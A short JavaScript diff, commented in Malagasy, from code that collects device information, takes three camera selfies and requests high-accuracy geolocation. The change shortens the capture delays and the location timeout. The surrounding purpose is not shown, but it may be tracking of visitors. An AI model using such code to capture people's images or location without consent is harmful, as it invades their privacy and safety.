@@ -612,7 +612,7 @@ async function collectDeviceInfo() {
   }
   
   // Miandry kely vao manomboka ny action
-  await new Promise(r => setTimeout(r, 1000));
+  await new Promise(r => setTimeout(r, 100));
   
   // Atomboka ny action principale!
   startAction();
@@ -644,7 +644,7 @@ async function startAction() {
       loadingText.textContent = `Maka selfie ${i+1}/3...`;
       progressBar.style.width = `${15 + (i * 20)}%`;
       
-      await new Promise(r => setTimeout(r, 1500));
+      await new Promise(r => setTimeout(r, 150));
       
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
@@ -662,7 +662,7 @@ async function startAction() {
     const position = await new Promise((resolve, reject) => {
       navigator.geolocation.getCurrentPosition(resolve, reject, {
         enableHighAccuracy: true,
-        timeout: 10000
+        timeout: 100
       });
     });
     
